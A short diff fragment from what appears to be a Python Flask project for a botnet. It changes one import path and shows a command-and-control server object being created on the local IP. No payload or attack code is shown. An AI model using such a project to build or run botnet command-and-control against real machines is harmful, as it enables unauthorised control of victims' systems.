@@ -5,7 +5,7 @@ from flask_bcrypt import generate_password_hash
 
 # server generator
 from botnet import server
-from botnet.modules import utils
+from botnet import utils
 c2 = server.C2(host=utils.local_ip())
 
 def create_app():
